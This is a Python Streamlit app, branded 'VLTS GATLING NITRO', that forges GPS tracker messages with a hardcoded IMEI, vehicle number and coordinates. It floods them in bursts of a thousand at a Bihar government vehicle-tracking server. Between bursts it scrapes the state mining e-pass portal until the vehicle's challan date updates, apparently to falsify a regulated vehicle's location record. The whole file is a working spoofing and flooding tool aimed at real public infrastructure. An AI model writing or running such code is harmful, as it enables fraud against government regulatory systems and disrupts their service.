import streamlit as st
import socket
import time
from datetime import datetime
import requests
from bs4 import BeautifulSoup
import threading

# --- Page Setup ---
st.set_page_config(page_title="GATLING NITRO V97", page_icon="🚀", layout="wide")

st.markdown("""
    <style>
    .main { background-color: #000; color: #0f0; }
    div.stButton > button { background-color: #004400; color: white; border-radius: 8px; font-weight: bold; width: 100%; height: 3.5em; }
    .stMetric { background-color: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; }
    </style>
    """, unsafe_allow_html=True)

st.title("🚀 VLTS GATLING NITRO - V97")
st.caption("Enterprise Edition - Logic: Request-based Sync (No Chrome)")

# --- Initialize States ---
if 'firing' not in st.session_state:
    st.session_state.firing = False
if 'total_count' not in st.session_state:
    st.session_state.total_count = 0
if 'last_portal_update' not in st.session_state:
    st.session_state.last_portal_update = "Waiting..."

# --- Sidebar ---
with st.sidebar:
    tag = st.text_input("TAG", "EGAS")
    imei = st.text_input("IMEI", "862567075041793")
    vno = st.text_input("VEHICLE NO", "BR04GA5974")
    lat = st.text_input("LATITUDE", "25.6501550")
    lon = st.text_input("LONGITUDE", "84.7851780")
    mode = st.radio("PROTOCOL", ["UDP", "TCP"], horizontal=True)

# --- Controls ---
c1, c2 = st.columns(2)
if c1.button("🔥 START ENGINE", disabled=st.session_state.firing):
    st.session_state.firing = True
    st.rerun()

if c2.button("🛑 STOP & RESET"):
    st.session_state.firing = False
    st.session_state.total_count = 0
    st.session_state.last_portal_update = "Waiting..."
    st.rerun()

st.divider()
m1 = st.empty(); m2 = st.empty()

# --- Portal Sync Logic (Request-based) ---
def get_portal_date(vehicle_no):
    try:
        url = "https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx"
        session = requests.Session()
        # Initial Get to capture ViewState
        r = session.get(url, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        data = {
            "__VIEWSTATE": soup.find(id="__VIEWSTATE")['value'],
            "__VIEWSTATEGENERATOR": soup.find(id="__VIEWSTATEGENERATOR")['value'],
            "__EVENTVALIDATION": soup.find(id="__EVENTVALIDATION")['value'],
            "txtVehicleNo": vehicle_no,
            "btnSearch": "Search"
        }
        
        # Post request to search vehicle
        r_post = session.post(url, data=data, timeout=5)
        soup_post = BeautifulSoup(r_post.text, 'html.parser')
        
        # Finding Challan Date in the table
        tds = soup_post.find_all('td')
        for i, td in enumerate(tds):
            if "Challan Date" in td.text:
                return tds[i+2].text.strip()
        return None
    except:
        return None

# --- Execution Engine ---
if st.session_state.firing:
    target = ("vlts.bihar.gov.in", 9999)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode == "UDP" else socket.SOCK_STREAM)
    
    if mode == "TCP":
        sock.settimeout(2)
        try: sock.connect(target)
        except: st.session_state.firing = False

    loop_counter = 0

    while st.session_state.firing:
        # 1. High Speed Fire (1000 Packets per cycle)
        now = datetime.now()
        p = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode('ascii')
        
        for _ in range(1000):
            sock.sendto(p, target) if mode == "UDP" else sock.send(p)
        
        st.session_state.total_count += 1000
        loop_counter += 1

        # UI Update
        m1.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
        m2.metric("Latest Portal Update", st.session_state.last_portal_update)

        # 2. Fast Sync Check (Every 10 cycles)
        if loop_counter >= 10:
            res = get_portal_date(vno)
            if res:
                st.session_state.last_portal_update = res
                if now.strftime("%d-%b-%Y").upper() in res.upper():
                    st.session_state.firing = False
            loop_counter = 0
        
        time.sleep(0.01)

    sock.close()
    st.rerun()
